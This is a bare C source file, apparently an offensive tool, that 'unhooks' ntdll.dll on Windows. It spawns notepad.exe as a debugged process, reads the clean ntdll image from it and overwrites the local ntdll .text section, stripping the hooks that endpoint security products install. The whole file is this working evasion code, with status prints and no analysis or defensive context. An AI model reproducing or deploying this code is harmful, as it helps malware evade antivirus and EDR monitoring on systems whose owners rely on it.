#include <windows.h>
#include <stdio.h>
#include <winternl.h>

static PVOID GetLocalNtdll(void) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

static SIZE_T GetNtdllSize(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return pNt->OptionalHeader.SizeOfImage;
}

static PVOID ReadCleanNtdll(void) {
    PVOID pLocalNtdll = GetLocalNtdll();
    SIZE_T sSize = GetNtdllSize((PBYTE)pLocalNtdll);
    if (!sSize) return NULL;

    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA: %d\n", GetLastError());
        return NULL;
    }
    printf("[+] Spawned PID %d\n", pi.dwProcessId);

    PVOID pBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sSize);
    SIZE_T sBytesRead = 0;
    BOOL ok = pBuf
        && ReadProcessMemory(pi.hProcess, pLocalNtdll, pBuf, sSize, &sBytesRead)
        && sBytesRead == sSize;

    DebugActiveProcessStop(pi.dwProcessId);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (!ok) { HeapFree(GetProcessHeap(), 0, pBuf); return NULL; }
    return pBuf;
}

static BOOL ReplaceTextSection(PVOID pClean) {
    PVOID pLocal = GetLocalNtdll();
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pLocal + ((PIMAGE_DOS_HEADER)pLocal)->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if ((*(ULONG*)pSec->Name | 0x20202020) != 0x7865742E)
            continue;

        PVOID pDst = (PBYTE)pLocal + pSec->VirtualAddress;
        PVOID pSrc = (PBYTE)pClean + pSec->VirtualAddress;
        SIZE_T sSize = pSec->Misc.VirtualSize;

        DWORD dwOld = 0;
        if (!VirtualProtect(pDst, sSize, PAGE_EXECUTE_WRITECOPY, &dwOld)) return FALSE;
        memcpy(pDst, pSrc, sSize);
        VirtualProtect(pDst, sSize, dwOld, &dwOld);

        printf("[+] .text replaced (%zu bytes)\n", sSize);
        return TRUE;
    }
    return FALSE;
}

int main(void) {
    PVOID pClean = ReadCleanNtdll();
    if (!pClean)             { printf("[-] Failed to read clean ntdll\n"); return 1; }
    if (!ReplaceTextSection(pClean)) { printf("[-] Failed to replace .text\n");      return 1; }
    printf("[+] ntdll unhooked\n");
    getchar();
    HeapFree(GetProcessHeap(), 0, pClean);
    return 0;
}
